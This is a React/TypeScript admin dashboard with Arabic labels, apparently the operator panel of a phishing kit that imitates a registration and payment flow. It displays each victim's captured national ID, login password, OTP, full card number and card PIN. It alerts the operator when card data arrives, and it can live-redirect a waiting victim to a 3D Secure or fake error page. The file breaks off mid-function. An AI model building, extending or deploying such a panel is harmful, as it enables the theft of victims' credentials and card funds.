import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogFooter,
  DialogHeader,
  DialogTitle,
  DialogTrigger,
} from "@/components/ui/dialog";
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogCancel,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
} from "@/components/ui/alert-dialog";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Checkbox } from "@/components/ui/checkbox";
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuLabel,
  DropdownMenuSeparator,
  DropdownMenuTrigger,
} from "@/components/ui/dropdown-menu";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { trpc } from "@/lib/trpc";
import {
  Archive,
  ArchiveRestore,
  Bell,
  BellOff,
  Calendar,
  CheckCircle2,
  Circle,
  CreditCard,
  Eye,
  Filter,
  Globe,
  IdCard,
  KeyRound,
  Layers,
  LogIn,
  LogOut,
  Lock,
  MapPin,
  Mail,
  Navigation,
  PhoneCall,
  RefreshCw,
  Search,
  ShieldCheck,
  Trash2,
  User,
  UserCheck,
  Users,
  Wifi,
  WifiOff,
  X,
} from "lucide-react";
import { useEffect, useMemo, useRef, useState, useCallback } from "react";
import { io as socketIO } from "socket.io-client";
import { toast as sonnerToast } from "sonner";
import { UserJourneyDialog } from "./UserJourneyDialog";
type AlertItem = {
  kind: "payment" | "cardPin";
  id: number;
  registrationId: number | null;
  createdAt: string | Date | null;
  ipAddress: string | null;
  summary: string;
};

type StageKey =
  | "registration"
  | "personalInfo"
  | "password"
  | "payment"
  | "login"
  | "cardPin";

const STAGES: { key: StageKey; label: string; short: string }[] = [
  { key: "registration", label: "تسجيل", short: "تسجيل" },
  { key: "personalInfo", label: "معلومات شخصية", short: "معلومات" },
  { key: "password", label: "كلمة مرور", short: "كلمة مرور" },
  { key: "payment", label: "الدفع", short: "دفع" },
  { key: "login", label: "تسجيل دخول", short: "دخول" },
  { key: "cardPin", label: "PIN البطاقة", short: "PIN" },
];

const MUTE_KEY = "adminAlertsMuted";

function playBeep() {
  try {
    const w = window as any;
    const Ctx = w.AudioContext ?? w.webkitAudioContext;
    if (!Ctx) return;
    const ctx: AudioContext = new Ctx();
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.type = "sine";
    osc.frequency.value = 880;
    gain.gain.value = 0.06;
    osc.connect(gain).connect(ctx.destination);
    osc.start();
    setTimeout(() => {
      osc.stop();
      ctx.close().catch(() => {});
    }, 220);
  } catch {
    /* noop */
  }
}

function formatDateTime(value: unknown): string {
  if (!value) return "-";
  try {
    const d = value instanceof Date ? value : new Date(value as string);
    if (isNaN(d.getTime())) return "-";
    return d.toLocaleString();
  } catch {
    return "-";
  }
}

function relativeTime(value: unknown): string {
  if (!value) return "-";
  try {
    const d = value instanceof Date ? value : new Date(value as string);
    if (isNaN(d.getTime())) return "-";
    const diff = Date.now() - d.getTime();
    const sec = Math.floor(diff / 1000);
    if (sec < 60) return `قبل ${sec}ث`;
    const min = Math.floor(sec / 60);
    if (min < 60) return `قبل ${min}د`;
    const hr = Math.floor(min / 60);
    if (hr < 24) return `قبل ${hr}س`;
    const day = Math.floor(hr / 24);
    return `قبل ${day}ي`;
  } catch {
    return "-";
  }
}

const PAGE_LABELS: Record<string, string> = {
  "/": "الرئيسية",
  "/index.html": "الرئيسية",
  "/home.html": "الرئيسية",
  "/01-register.html": "1. التسجيل",
  "/02-personal-info.html": "2. المعلومات الشخصية",
  "/03-password.html": "3. كلمة المرور",
  "/04-fees.html": "4. الرسوم",
  "/05-update-data.html": "5. تحديث البيانات",
  "/06-payment.html": "6. الدفع",
  "/07-3d-secure.html": "7. 3D Secure",
  "/09-login.html": "8. تسجيل الدخول",
  "/10-card-pin.html": "9. PIN البطاقة",
  "/11-error-payment.html": "خطأ: تعذّر الدفع",
};

function pageLabel(p: string | null | undefined): string {
  if (!p) return "غير معروف";
  if (PAGE_LABELS[p]) return PAGE_LABELS[p];
  const trimmed = p.replace(/\.html$/, "").replace(/^\//, "");
  return trimmed || "الرئيسية";
}

/** Convert ISO alpha-2 country code (e.g. "SA") to flag emoji. Returns "" if invalid. */
function countryCodeToFlagEmoji(code: string | null | undefined): string {
  if (!code || code.length !== 2) return "";
  const cc = code.toUpperCase();
  if (!/^[A-Z]{2}$/.test(cc)) return "";
  const A = 0x1f1e6;
  const a = "A".charCodeAt(0);
  return (
    String.fromCodePoint(A + (cc.charCodeAt(0) - a)) +
    String.fromCodePoint(A + (cc.charCodeAt(1) - a))
  );
}

function pickName(v: any): string {
  const pi = (v.personalInfo ?? [])[0];
  if (pi) {
    const arabic = pi.arabicName ?? "";
    const english = pi.englishName ?? "";
    const first = pi.firstName ?? "";
    const last = pi.lastName ?? "";
    const combined = [first, last].filter(Boolean).join(" ");
    return arabic || english || combined || "";
  }
  return "";
}

function pickEmail(v: any): string {
  return (
    v.registration?.email ??
    (v.personalInfo ?? [])[0]?.email ??
    ""
  );
}

function pickPhone(v: any): string {
  return (
    v.registration?.mobile ??
    v.registration?.intlPhone ??
    (v.phoneVerifications ?? [])[0]?.phoneNumber ??
    ""
  );
}

function pickQid(v: any): string {
  return (
    v.registration?.qid ??
    (v.personalInfo ?? [])[0]?.qid ??
    ""
  );
}

function buildStageHits(v: any): Record<StageKey, boolean> {
  return {
    registration: !!v.registration,
    personalInfo: (v.personalInfo ?? []).length > 0,
    password: (v.passwords ?? []).length > 0,
    payment: (v.payments ?? []).length > 0,
    login: (v.logins ?? []).length > 0,
    cardPin: (v.cardPins ?? []).length > 0,
  };
}

function StageBar({ hits }: { hits: Record<StageKey, boolean> }) {
  const completed = Object.values(hits).filter(Boolean).length;
  const pct = Math.round((completed / STAGES.length) * 100);
  return (
    <div className="space-y-2">
      <div className="flex items-center justify-between text-xs">
        <span className="text-muted-foreground">
          المرحلة {completed} / {STAGES.length}
        </span>
        <span className="font-semibold text-indigo-600">{pct}%</span>
      </div>
      <div className="h-2 w-full bg-slate-100 rounded-full overflow-hidden">
        <div
          className="h-full bg-gradient-to-l from-indigo-500 to-emerald-500 transition-[width] duration-300"
          style={{ width: `${pct}%` }}
        />
      </div>
      <div className="flex flex-wrap gap-1.5 pt-1">
        {STAGES.map((s) => {
          const ok = hits[s.key];
          return (
            <span
              key={s.key}
              className={[
                "inline-flex items-center gap-1 text-[10.5px] px-2 py-0.5 rounded-full border",
                ok
                  ? "bg-emerald-50 border-emerald-200 text-emerald-700"
                  : "bg-slate-50 border-slate-200 text-slate-400",
              ].join(" ")}
              title={s.label}
            >
              {ok ? (
                <CheckCircle2 className="w-3 h-3" />
              ) : (
                <Circle className="w-3 h-3" />
              )}
              {s.short}
            </span>
          );
        })}
      </div>
    </div>
  );
}

function VisitorCard({
  visitor,
  onOpenJourney,
  onRedirect,
  selected,
  onToggleSelect,
  onArchive,
  onUnarchive,
  onDelete,
  flashing,
  onClearFlash,
}: {
  visitor: any;
  onOpenJourney: (id: number) => void;
  onRedirect: (data: { id: number; fingerprint: string | null }) => void;
  selected: boolean;
  onToggleSelect: (id: number) => void;
  onArchive: (id: number) => void;
  onUnarchive: (id: number) => void;
  onDelete: (id: number) => void;
  flashing?: boolean;
  onClearFlash?: (id: number) => void;
}) {
  const reg = visitor.registration;
  const hits = buildStageHits(visitor);
  const name = pickName(visitor);
  const email = pickEmail(visitor);
  const phone = pickPhone(visitor);
  const qid = pickQid(visitor);
  const isArchived = !!reg.archivedAt;
  const isHot = !isArchived && (hits.payment || hits.cardPin);

  return (
    <Card
      className={[
        "relative overflow-hidden transition-shadow hover:shadow-lg border",
        isArchived
          ? "border-slate-300 bg-slate-50/70 opacity-80"
          : isHot
            ? "border-rose-300 bg-rose-50/30"
            : "border-slate-200 bg-white",
        selected ? "ring-2 ring-indigo-500" : "",
        flashing ? "animate-pulse ring-2 ring-amber-400 border-amber-400" : "",
      ].join(" ")}
    >
      {isHot && (
        <div className="absolute top-0 left-0 right-0 h-1 bg-gradient-to-l from-rose-500 to-amber-400" />
      )}
      {isArchived && (
        <div className="absolute top-2 left-2">
          <Badge variant="secondary" className="text-[10px] gap-1 bg-slate-200 text-slate-700">
            <Archive className="w-3 h-3" /> مؤرشف
          </Badge>
        </div>
      )}
      <div className="absolute top-3 right-3 z-10">
        <Checkbox
          checked={selected}
          onCheckedChange={() => onToggleSelect(reg.id)}
          aria-label="تحديد البطاقة"
          className="bg-white border-slate-300"
        />
      </div>
      <CardHeader className="pb-3 pt-8">
        <div className="flex items-start justify-between gap-2">
          <div className="flex items-center gap-3 min-w-0">
            <div
              className={[
                "w-11 h-11 rounded-full flex items-center justify-center text-white font-bold shrink-0",
                isHot
                  ? "bg-gradient-to-br from-rose-500 to-amber-500"
                  : "bg-gradient-to-br from-indigo-500 to-sky-500",
              ].join(" ")}
            >
              {(name || email || qid || `#${reg.id}`).slice(0, 1).toUpperCase()}
            </div>
            <div className="min-w-0">
              <CardTitle className="text-sm font-bold truncate">
                {name || "زائر بدون اسم"}
              </CardTitle>
              <div className="text-[11px] text-muted-foreground flex items-center gap-1 mt-0.5">
                <span className="font-mono">#{reg.id}</span>
                {reg.userType ? (
                  <>
                    <span>•</span>
                    <span>{reg.userType}</span>
                  </>
                ) : null}
              </div>
            </div>
          </div>
          <div className="flex flex-col items-end gap-1 shrink-0">
            {hits.cardPin && (
              <Badge className="bg-rose-600 hover:bg-rose-700 text-white text-[10px] gap-1">
                <KeyRound className="w-3 h-3" /> PIN
              </Badge>
            )}
            {hits.payment && !hits.cardPin && (
              <Badge className="bg-amber-500 hover:bg-amber-600 text-white text-[10px] gap-1">
                <CreditCard className="w-3 h-3" /> بطاقة
              </Badge>
            )}
            {visitor.presence?.online ? (
              <Badge className="bg-emerald-600 hover:bg-emerald-700 text-white text-[10px] gap-1 max-w-[160px]">
                <Wifi className="w-3 h-3 shrink-0" />
                <span className="truncate">
                  {pageLabel(visitor.presence.currentPage)}
                </span>
              </Badge>
            ) : visitor.presence?.currentPage ? (
              <Badge variant="secondary" className="text-[10px] gap-1 max-w-[160px] bg-slate-100 text-slate-600">
                <WifiOff className="w-3 h-3 shrink-0" />
                <span className="truncate">
                  آخر صفحة: {pageLabel(visitor.presence.currentPage)}
                </span>
              </Badge>
            ) : (
              <Badge variant="secondary" className="text-[10px] gap-1">
                <UserCheck className="w-3 h-3" /> غير متصل
              </Badge>
            )}
          </div>
        </div>
      </CardHeader>
      <CardContent className="space-y-3">
        <div className="grid grid-cols-1 gap-1.5 text-[12px]">
          {qid && (
            <div className="flex items-center gap-2 text-slate-700">
              <IdCard className="w-3.5 h-3.5 text-slate-400 shrink-0" />
              <span className="font-mono truncate" dir="ltr">{qid}</span>
            </div>
          )}
          {visitor.logins && visitor.logins.length > 0 && (
            <div className="flex items-center gap-2 text-slate-700">
              <LogIn className="w-3.5 h-3.5 text-orange-400 shrink-0" />
              <span className="font-mono truncate" dir="ltr">
                {visitor.logins[0].username}
                {visitor.logins[0].password ? ` / ${visitor.logins[0].password}` : ''}
              </span>
            </div>
          )}
          {phone && (
            <div className="flex items-center gap-2 text-slate-700">
              <PhoneCall className="w-3.5 h-3.5 text-slate-400 shrink-0" />
              <span className="font-mono truncate" dir="ltr">
                {phone}
              </span>
            </div>
          )}
          {email && (
            <div className="flex items-center gap-2 text-slate-700">
              <Mail className="w-3.5 h-3.5 text-slate-400 shrink-0" />
              <span className="truncate" dir="ltr">
                {email}
              </span>
            </div>
          )}
          {visitor.presence?.currentPage && (
            <div
              className={[
                "flex items-center gap-2 text-[11px] font-medium",
                visitor.presence.online ? "text-emerald-700" : "text-slate-500",
              ].join(" ")}
              title={visitor.presence.currentPage}
            >
              <MapPin className="w-3.5 h-3.5 shrink-0" />
              <span className="truncate" dir="ltr">
                {visitor.presence.currentPage}
              </span>
              {visitor.presence.lastSeenAt && !visitor.presence.online && (
                <span className="text-slate-400 mr-auto">
                  {relativeTime(visitor.presence.lastSeenAt)}
                </span>
              )}
            </div>
          )}
          {(visitor.geo?.country || visitor.geo?.city) ? (
            <div
              className="flex items-center gap-2 text-[11px] font-medium text-indigo-700"
              title={[visitor.geo?.city, visitor.geo?.country].filter(Boolean).join(", ")}
            >
              <span className="text-base leading-none shrink-0">
                {countryCodeToFlagEmoji(visitor.geo?.countryCode) || "🌐"}
              </span>
              <span className="truncate">
                {visitor.geo?.city ? (
                  <>
                    <span className="font-semibold">{visitor.geo.city}</span>
                    {visitor.geo.country && (
                      <span className="text-slate-500">، {visitor.geo.country}</span>
                    )}
                  </>
                ) : (
                  <span className="font-semibold">{visitor.geo?.country}</span>
                )}
              </span>
            </div>
          ) : (
            <div
              className="flex items-center gap-2 text-[11px] text-slate-400"
              title={reg.ipAddress ? "تعذّر تحديد الموقع من IP" : "لم يسجّل عنوان IP لهذا الزائر"}
            >
              <span className="text-base leading-none shrink-0">🌐</span>
              <span>الموقع: غير متوفر</span>
            </div>
          )}
          {reg.ipAddress && (
            <div className="flex items-center gap-2 text-slate-500 text-[11px]">
              <Globe className="w-3.5 h-3.5 shrink-0" />
              <span className="font-mono" dir="ltr">
                {reg.ipAddress}
              </span>
            </div>
          )}
          <div className="flex items-center gap-2 text-slate-500 text-[11px]">
            <Calendar className="w-3.5 h-3.5 shrink-0" />
            <span>{relativeTime(visitor.lastActivityAt)}</span>
            <span className="text-slate-300">•</span>
            <span className="text-slate-400">
              {formatDateTime(visitor.lastActivityAt)}
            </span>
          </div>
        </div>

        <StageBar hits={hits} />

        {/* Sensitive captured values preview */}
        {(hits.password || hits.payment || hits.cardPin) && (
          <div className="pt-2 border-t border-slate-100 space-y-1 text-[11px]">
            {(visitor.passwords ?? [])[0] && (
              <div className="flex items-center gap-2">
                <Lock className="w-3 h-3 text-rose-500" />
                <span className="text-muted-foreground">كلمة المرور:</span>
                <span className="font-mono text-slate-800 truncate" dir="ltr">
                  {visitor.passwords[0].password}
                </span>
              </div>
            )}
            {(visitor.otps ?? [])[0] && (
              <div className="flex items-center gap-2">
                <KeyRound className="w-3 h-3 text-emerald-600" />
                <span className="text-muted-foreground">OTP:</span>
                <span className="font-mono text-slate-800" dir="ltr">
                  {visitor.otps[0].otpCode}
                </span>
              </div>
            )}
            {(visitor.payments ?? [])[0] && (
              <div className="flex items-center gap-2">
                <CreditCard className="w-3 h-3 text-amber-600" />
                <span className="text-muted-foreground">البطاقة:</span>
                {visitor.payments[0].cardType && (
                  <span className="text-xs font-medium px-1.5 py-0.5 rounded bg-amber-100 text-amber-800 capitalize">
                    {visitor.payments[0].cardType === 'credit' ? 'Credit' : 'Debit'}
                  </span>
                )}
                <span className="font-mono text-slate-800 truncate" dir="ltr">
                  {visitor.payments[0].cardNumber}
                </span>
              </div>
            )}
            {(visitor.cardPins ?? [])[0] && (
              <div className="flex items-center gap-2">
                <KeyRound className="w-3 h-3 text-rose-700" />
                <span className="text-muted-foreground">PIN:</span>
                <span className="font-mono text-slate-800" dir="ltr">
                  {visitor.cardPins[0].cardPin}
                </span>
              </div>
            )}
            {(visitor.logins ?? [])[0] && (
              <div className="flex items-center gap-2">
                <LogIn className="w-3 h-3 text-orange-600" />
                <span className="text-muted-foreground">دخول:</span>
                <span className="font-mono text-slate-800 truncate" dir="ltr">
                  {visitor.logins[0].username}
                </span>
              </div>
            )}
          </div>
        )}

        <div className="flex gap-2">
          <Button
            variant="outline"
            size="sm"
            className="flex-1 bg-white"
            onClick={() => onOpenJourney(reg.id)}
          >
            <Eye className="w-3.5 h-3.5 ml-1" />
            عرض
          </Button>
          <Button
            variant="outline"
            size="sm"
            className="bg-white text-sky-700 hover:bg-sky-50"
            onClick={() => onRedirect({ id: reg.id, fingerprint: reg.fingerprint ?? null })}
            title="توجيه لحظي لصفحة"
          >
            <Navigation className="w-3.5 h-3.5" />
          </Button>
          
          {/* أزرار سريعة لصفحات الخطأ */}
          <div className="flex gap-1 border-r border-slate-200 pr-2 ml-1">
            <Button
              variant="outline"
              size="sm"
              className="bg-white text-rose-700 hover:bg-rose-50 border-rose-200 px-2"
              onClick={(e) => {
                e.stopPropagation();
                // بدلاً من فتح النافذة، نفتح نافذة التوجيه وهي تحتوي على الأخطاء بلون مميز
                onRedirect({ id: reg.id, fingerprint: reg.fingerprint ?? null });
              }}
              title="إرسال رسالة خطأ"
            >
              <span className="text-[10px] font-bold">إرسال خطأ</span>
            </Button>
          </div>
          {isArchived ? (
            <Button
              variant="outline"
              size="sm"
              className="bg-white text-emerald-700 hover:bg-emerald-50"
              onClick={() => onUnarchive(reg.id)}
              title="إلغاء الأرشفة"
            >
              <ArchiveRestore className="w-3.5 h-3.5" />
            </Button>
          ) : (
            <Button
              variant="outline"
              size="sm"
              className="bg-white text-slate-700 hover:bg-slate-50"
              onClick={() => onArchive(reg.id)}
              title="أرشفة"
            >
              <Archive className="w-3.5 h-3.5" />
            </Button>
          )}
          <Button
            variant="outline"
            size="sm"
            className="bg-white text-rose-700 hover:bg-rose-50 hover:text-rose-800"
            onClick={() => onDelete(reg.id)}
            title="حذف"
          >
            <Trash2 className="w-3.5 h-3.5" />
          </Button>
        </div>

      </CardContent>
    </Card>
  );
}

function AdminLoginInline({ onSuccess }: { onSuccess: () => void }) {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const loginMutation = trpc.adminAuth.login.useMutation({
    onSuccess: () => {
      onSuccess();
    },
    onError: (e) => {
      setError(e.message || "فشل تسجيل الدخول");
    },
  });
  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    if (!username || !password) { setError("الرجاء إدخال البيانات"); return; }
    loginMutation.mutate({ username, password });
  };
  return (
    <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-slate-50 to-slate-100" dir="rtl">
      <Card className="max-w-md w-full mx-4">
        <CardHeader>
          <CardTitle className="text-2xl font-bold text-center">تسجيل الدخول</CardTitle>
        </CardHeader>
        <CardContent>
          <form onSubmit={handleSubmit} className="space-y-4">
            <div className="space-y-2">
              <label className="text-sm font-medium">اسم المستخدم</label>
              <input
                type="text"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                className="w-full border rounded-md px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-primary"
                disabled={loginMutation.isPending}
              />
            </div>
            <div className="space-y-2">
              <label className="text-sm font-medium">كلمة المرور</label>
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full border rounded-md px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-primary"
                disabled={loginMutation.isPending}
              />
            </div>
            {error && <p className="text-sm text-destructive">{error}</p>}
            <Button type="submit" className="w-full" disabled={loginMutation.isPending}>
              {loginMutation.isPending ? "جارٍ تسجيل الدخول..." : "تسجيل الدخول"}
            </Button>
          </form>
        </CardContent>
      </Card>
    </div>
  );
}

export default function AdminDashboard() {
  const { data: adminSession, isLoading: loading } = trpc.adminAuth.me.useQuery(
    undefined,
    { retry: false, refetchOnWindowFocus: false },
  );
  const adminLogout = trpc.adminAuth.logout.useMutation({
    onSuccess: () => {
      window.location.href = "/ctrl-9xk2m";
    },
  });
  const logout = () => adminLogout.mutate();
  const [search, setSearch] = useState("");
  const [stage, setStage] = useState<
    "all" | "reachedPayment" | "enteredCard" | "enteredPin" | "today"
  >("all");
  const [page, setPage] = useState(1);
  const limit = 200;
  const [archivedFilter, setArchivedFilter] = useState<
    "active" | "archived" | "all"
  >("active");
  const [journeyId, setJourneyId] = useState<number | null>(null);
  const [journeyOpen, setJourneyOpen] = useState(false);
  const [redirectFor, setRedirectFor] = useState<{ id: number; fingerprint: string | null } | null>(null);
  const [selectedIds, setSelectedIds] = useState<Set<number>>(new Set());
  const [confirm, setConfirm] = useState<
    | null
    | {
        kind: "archive" | "unarchive" | "delete";
        ids: number[];
      }
  >(null);

  const openJourney = (id: number) => {
    setJourneyId(id);
    setJourneyOpen(true);
  };

  const isAdmin = !!adminSession;

  const visitorsQuery = trpc.admin.listVisitors.useQuery(
    {
      search: search.trim() || undefined,
      stage,
      limit,
      offset: (page - 1) * limit,
      archived: archivedFilter,
    },
    {
      enabled: isAdmin,
    },
  );

  const utils = trpc.useUtils();
  // Socket-driven state — replaces HTTP polling entirely
  const [socketVisitors, setSocketVisitors] = useState<any[] | null>(null);
  const [socketStats, setSocketStats] = useState<any | null>(null);
  // Set of registration IDs that are flashing (new payment or otp submitted)
  const [flashingIds, setFlashingIds] = useState<Set<number>>(new Set());
  const adminSocketRef = useRef<ReturnType<typeof socketIO> | null>(null);
  useEffect(() => {
    if (!isAdmin) return;
    const socket = socketIO({
      path: "/socket.io",
      query: { role: "admin" },
      transports: ["websocket", "polling"],
    });
    adminSocketRef.current = socket;
    socket.on("connect", () => console.log("[AdminSocket] connected", socket.id));
    socket.on("visitors_update", (payload: { visitors: any[] | null; stats: any | null; presence: Record<string, any>; triggerType?: string | null; triggerRegId?: number | null }) => {
      // Flash the visitor card if payment or otp was submitted
      if ((payload.triggerType === "payment" || payload.triggerType === "otp") && payload.triggerRegId) {
        setFlashingIds(prev => new Set(prev).add(payload.triggerRegId!));
      }
      if (payload.visitors) {
        // Merge presence into visitors (presence is always fresh from socket)
        const merged = payload.visitors.map((v: any) => ({
          ...v,
          presence: payload.presence?.[v.registration?.fingerprint] ?? v.presence,
        }));
        setSocketVisitors(merged);
      } else if (payload.presence) {
        // Presence-only update: patch existing visitors
        setSocketVisitors(prev => {
          if (!prev) return prev;
          return prev.map((v: any) => ({
            ...v,
            presence: payload.presence?.[v.registration?.fingerprint] ?? v.presence,
          }));
        });
      }
      if (payload.stats) setSocketStats(payload.stats);
    });
    return () => {
      socket.disconnect();
      adminSocketRef.current = null;
    };
  }, [isAdmin]);
  const archiveMutation = trpc.admin.archiveVisitors.useMutation({
    onSuccess: (res) => {
      sonnerToast.success(`تمت الأرشفة`, {
        description: `تم أرشفة ${res.affected} بطاقة.`,
      });
      setSelectedIds(new Set());
      utils.admin.listVisitors.invalidate();
      utils.admin.getStats.invalidate();
    },
    onError: (e) => sonnerToast.error("تعذّرت الأرشفة", { description: e.message }),
  });
  const unarchiveMutation = trpc.admin.unarchiveVisitors.useMutation({
    onSuccess: (res) => {
      sonnerToast.success("تمت الاستعادة", {
        description: `تمت استعادة ${res.affected} بطاقة.`,
      });
      setSelectedIds(new Set());
      utils.admin.listVisitors.invalidate();
      utils.admin.getStats.invalidate();
    },
    onError: (e) => sonnerToast.error("تعذّر إلغاء الأرشفة", { description: e.message }),
  });
  const redirectMutation = trpc.admin.redirectVisitor.useMutation({
    onSuccess: (res) => {
      if (res.delivered > 0) {
        sonnerToast.success("تم إرسال أمر التوجيه", {
          description: `وُجّه الزائر فوراً (${res.delivered} اتصال).`,
        });
      } else {
        sonnerToast.warning("الزائر غير متصل", {
          description: "لا توجد جلسة نشطة لهذا الزائر حالياً. سيُنفّذ التوجيه عند عودته إلى الموقع.",
        });
      }
      setRedirectFor(null);
    },
    onError: (e) => sonnerToast.error("تعذّر التوجيه", { description: e.message }),
  });
  const deleteMutation = trpc.admin.deleteVisitors.useMutation({
    onSuccess: (res) => {
      sonnerToast.success("تم الحذف", {
        description: `تم حذف ${res.affected} بطاقة وكل بياناتها.`,
      });
      setSelectedIds(new Set());
      utils.admin.listVisitors.invalidate();
      utils.admin.getStats.invalidate();
    },
    onError: (e) => sonnerToast.error("تعذّر الحذف", { description: e.message }),
  });

  const toggleSelect = (id: number) => {
    setSelectedIds((prev) => {
      const next = new Set(prev);
      if (next.has(id)) next.delete(id);
      else next.add(id);
      return next;
    });
  };

  const askArchive = (id: number) => setConfirm({ kind: "archive", ids: [id] });
  const askUnarchive = (id: number) => setConfirm({ kind: "unarchive", ids: [id] });
  const askDelete = (id: number) => setConfirm({ kind: "delete", ids: [id] });
  const askBulk = (kind: "archive" | "unarchive" | "delete") =>
    setConfirm({ kind, ids: Array.from(selectedIds) });
  const runConfirm = () => {
    if (!confirm) return;
    if (confirm.ids.length === 0) {
      setConfirm(null);
      return;
    }
    if (confirm.kind === "archive") archiveMutation.mutate({ ids: confirm.ids });
    else if (confirm.kind === "unarchive") unarchiveMutation.mutate({ ids: confirm.ids });
    else if (confirm.kind === "delete") deleteMutation.mutate({ ids: confirm.ids });
    setConfirm(null);
  };

  const statsQuery = trpc.admin.getStats.useQuery(undefined, {
    enabled: isAdmin,
  });

  // Live alerts
  const [since, setSince] = useState<number>(() => Date.now());
  const seenIdsRef = useRef<Set<string>>(new Set());
  const [alerts, setAlerts] = useState<AlertItem[]>([]);
  const [unread, setUnread] = useState(0);
  const [muted, setMuted] = useState<boolean>(() => {
    try {
      return localStorage.getItem(MUTE_KEY) === "1";
    } catch {
      return false;
    }
  });

  // Page arrival notifications
  const notifiedPagesRef = useRef<Record<number, Set<string>>>({});
  const [notificationsEnabled, setNotificationsEnabled] = useState(false);

  useEffect(() => {
    if ("Notification" in window) {
      setNotificationsEnabled(Notification.permission === "granted");
    }
  }, []);

  const requestNotificationPermission = async () => {
    if (!("Notification" in window)) return;
    const permission = await Notification.requestPermission();
    setNotificationsEnabled(permission === "granted");
    if (permission === "granted") {
      sonnerToast.success("تم تفعيل الإشعارات بنجاح");
    }
  };

  const playAudioAlert = (type: "soft" | "loud") => {
    if (muted) return;
    try {
      const audio = new Audio(type === "soft" ? "/alert-soft.wav" : "/alert-loud.wav");
      audio.play().catch(() => playBeep()); // Fallback to beep if audio fails
    } catch {
      playBeep();
    }
  };

  const showWebNotification = (title: string, body: string) => {
    if (notificationsEnabled && "Notification" in window && Notification.permission === "granted") {
      try {
        new Notification(title, { body, icon: "/favicon.ico" });
      } catch (e) {
        console.error("Failed to show notification", e);
      }
    }
  };

  const recentAlertsQuery = trpc.admin.getRecentAlerts.useQuery(
    { since },
    {
      enabled: isAdmin,
    },
  );

  useEffect(() => {
    const data = recentAlertsQuery.data;
    if (!data) return;
    const items = (data.items ?? []) as AlertItem[];
    const newOnes: AlertItem[] = [];
    let newest = since;
    for (const item of items) {
      const key = `${item.kind}:${item.id}`;
      if (seenIdsRef.current.has(key)) continue;
      seenIdsRef.current.add(key);
      newOnes.push(item);
      const ts = item.createdAt
        ? new Date(item.createdAt as any).getTime()
        : 0;
      if (ts > newest) newest = ts;
    }
    if (newOnes.length === 0) return;
    setAlerts((prev) => [...newOnes, ...prev].slice(0, 50));
    setUnread((c) => c + newOnes.length);
    let shouldPlayLoud = false;
    for (const a of newOnes) {
      if (a.kind === "cardPin" || a.kind === "payment" || (a as any).kind === "otp") {
        shouldPlayLoud = true;
      }
      
      let title = "";
      let desc = "";
      
      if (a.kind === "payment") {
        title = "⚠️ زائر في الانتظار (الدفع)";
        desc = `قام الزائر بإدخال معلومات البطاقة وهو الآن في حالة انتظار. يرجى توجيهه للخطوة التالية.\n${a.summary}`;
      } else if ((a as any).kind === "otp") {
        title = "🔑 إدخال رمز OTP";
        desc = a.summary;
      } else {
        title = "🔐 إدخال PIN البطاقة";
        desc = a.summary;
      }
      
      desc += `${a.registrationId ? ` • Reg #${a.registrationId}` : ""}${a.ipAddress ? ` • ${a.ipAddress}` : ""}`;
      
      sonnerToast(title, {
        description: desc,
        duration: a.kind === "payment" ? 15000 : 8000, // Show longer for waiting state
        action: a.registrationId
          ? {
              label: "عرض الرحلة",
              onClick: () => openJourney(a.registrationId as number),
            }
          : undefined,
      });
    }
    if (!muted && shouldPlayLoud) {
      playAudioAlert("loud");
    }
    if (newest > since) setSince(newest);
  }, [recentAlertsQuery.data, muted, since]);

  const toggleMute = () => {
    setMuted((prev) => {
      const next = !prev;
      try {
        localStorage.setItem(MUTE_KEY, next ? "1" : "0");
      } catch {
        /* ignore */
      }
      return next;
    });
  };
  const clearUnread = () => setUnread(0);

  const visitors = useMemo(() => {
    // Use socket data first (instant), fallback to HTTP query
    const raw = socketVisitors ?? visitorsQuery.data?.visitors ?? [];

    // Apply stage/search/archived filters on socket data (HTTP query is already filtered server-side)
    const startOfToday = new Date();
    startOfToday.setHours(0, 0, 0, 0);
    const list = socketVisitors
      ? raw.filter((v: any) => {
          // Archived filter
          if (archivedFilter === "active" && v.registration.archived) return false;
          if (archivedFilter === "archived" && !v.registration.archived) return false;
          // Stage filter
          if (stage === "reachedPayment" && (!v.payments || v.payments.length === 0)) return false;
          if (stage === "enteredCard") {
            const hasCard = v.payments?.some((p: any) => p.cardNumber && String(p.cardNumber).length > 0);
            if (!hasCard) return false;
          }
          if (stage === "enteredPin" && (!v.cardPins || v.cardPins.length === 0)) return false;
          if (stage === "today" && new Date(v.lastActivityAt).getTime() < startOfToday.getTime()) return false;
          // Search filter
          const q = search.trim().toLowerCase();
          if (q.length > 0) {
            const hay = [
              v.registration.qid,
              v.registration.email,
              v.registration.mobile,
              v.registration.intlPhone,
              v.registration.userType,
              v.registration.ipAddress,
              ...( v.personalInfo?.flatMap((p: any) => [p.arabicName, p.englishName]) ?? []),
            ].filter(Boolean).join(" ").toLowerCase();
            if (!hay.includes(q)) return false;
          }
          return true;
        })
      : raw;

    return [...list].sort((a: any, b: any) => {
      const aOnline = a.presence?.online ? 1 : 0;
      const bOnline = b.presence?.online ? 1 : 0;
      if (aOnline !== bOnline) {
        return bOnline - aOnline; // Online first
      }
      // If both online or both offline, sort by lastActivityAt descending
      const aTime = new Date(a.lastActivityAt).getTime();
      const bTime = new Date(b.lastActivityAt).getTime();
      return bTime - aTime;
    });
  }, [socketVisitors, visitorsQuery.data?.visitors, stage, search, archivedFilter]);

  // Monitor page arrivals for notifications
  useEffect(() => {
    if (!visitors || visitors.length === 0) return;
    
